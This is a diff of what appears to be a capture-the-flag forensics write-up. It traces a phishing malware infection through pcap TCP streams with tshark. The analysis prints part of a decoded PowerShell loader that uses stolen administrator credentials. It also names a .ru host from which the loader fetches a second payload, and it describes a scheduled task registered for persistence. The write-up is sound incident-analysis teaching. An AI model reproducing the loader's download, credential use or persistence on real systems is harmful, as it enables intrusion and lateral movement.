@@ -118,11 +118,20 @@ md5sum helpdesk.exe
 #8d8b36683ed095a7eebe4e8c70141bfc
 ````
 
+### TCP stream analysis : Malware loader download
+
+<p align="justify">So far the logic of the compromission is:</p>
+
+- The victim (192.168.50.17) opened a phishing mail and downloaded the archive attached containing the malware
+- The victim executed the malware 
+
+<p align="justify">Now let's dig into TCP streams again to understand what tasks the malware performed on the victim host (no reverse engineering needed). Looking at the stream number 33, it looks like the malware executed by the victim contacted a remote host (controlled by attacker, to download a powershell script wich load a malware):</p>
+
 
 ````bash
 tshark -r chall.pcap -qz follow,tcp,ascii,33
 ````
-
+ 
 ````text
 GET /deploy-malware.ps1 HTTP/1.1
 accept: */*
@@ -137,6 +146,8 @@ Last-Modified: Sun, 22 Jun 2025 07:36:39 GMT
 
 [***] some powershell lines encoded
 ````
+
+<p align="justify">The powershell script (deploy_malware.ps1) contains an encoded powershell script; which once decoded looks like:</p>
 
 ````powershell
 $User = "alice-corp\administrateur"
@@ -180,6 +191,11 @@ try {
     Write-Host ""
 }
 ````
+
+<p align="justify">This script uses administrator credentials to connect to the server (192.168.50.200) and download a second malware on the server http://susqoUh.ru:8000/. Then a scheduled task is registered for persistence. As a matter of fact, this assumes that the attacker found a way to dump admin credentials on victim's desktop machine.</p>
+
+
+### TCP stream analysis: Sever malware download 
 
 ````bash
 tshark -r chall.pcap -Y "tcp.stream eq 37"
